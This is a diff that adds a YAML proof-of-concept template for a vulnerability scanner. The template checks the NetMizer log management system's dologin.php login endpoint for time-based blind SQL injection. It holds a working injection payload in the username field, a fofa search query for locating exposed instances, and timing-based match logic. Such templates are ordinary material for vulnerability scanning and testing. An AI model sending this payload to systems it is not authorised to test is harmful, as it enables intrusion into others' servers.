@@ -1,0 +1,37 @@
+id: poc-yaml-netmizer-log-ms-dologin-php-sqli
+info:
+  name: NetMizer 日志管理系统 dologin.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: NetMizer 日志管理系统
+  fofa: app="NetMizer-日志管理系统"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /data/login/dologin.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: action=login&username=' OR SLEEP({{.t1}})-- qAZp&passwd=1
+  expression: 'status_code == 200 &&
+
+    contains(body,`''success'':true`) &&
+
+    (
+
+    contains(gbk_decode(body),"该用户不存在")
+
+    ||
+
+    contains(body,"该用户不存在")
+
+    ) &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
